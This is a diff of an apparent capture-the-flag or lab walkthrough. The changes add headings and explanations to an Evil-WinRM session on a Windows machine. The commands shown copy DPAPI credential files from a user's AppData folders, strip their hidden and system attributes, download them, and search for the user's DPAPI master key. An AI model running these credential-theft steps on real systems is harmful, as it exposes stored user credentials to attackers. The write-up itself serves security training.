@@ -329,7 +329,10 @@ Mode                 LastWriteTime         Length Name
 *Evil-WinRM* PS C:\Users\steph.cooper>
 ```
 
-```
+After that we need to copy these files to a location where we can download them after removing the system and hidden attributes:
+
+#### Copy the files:
+```bash
 *Evil-WinRM* PS C:\Users\steph.cooper> copy C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D .\cred1
 *Evil-WinRM* PS C:\Users\steph.cooper> copy C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 .\cred2
 *Evil-WinRM* PS C:\Users\steph.cooper> dir
@@ -337,7 +340,11 @@ Mode                 LastWriteTime         Length Name
 
     Directory: C:\Users\steph.cooper
 
+```
 
+#### Remove the system and hidden attributes:
+
+```bash
 *Evil-WinRM* PS C:\Users\steph.cooper> attrib -s -h cred*
 *Evil-WinRM* PS C:\Users\steph.cooper> dir
 
@@ -354,6 +361,7 @@ Info: Download successful!
 
 ```
 
+#### Locating and Downloading the Master Key
 ```
 *Evil-WinRM* PS C:\Users\steph.cooper> gci -path c:\users\steph.cooper -force -recurse -file -ea silentlycontinue | Where-Object { $_.FullName -match '\\Protect\\' }
 
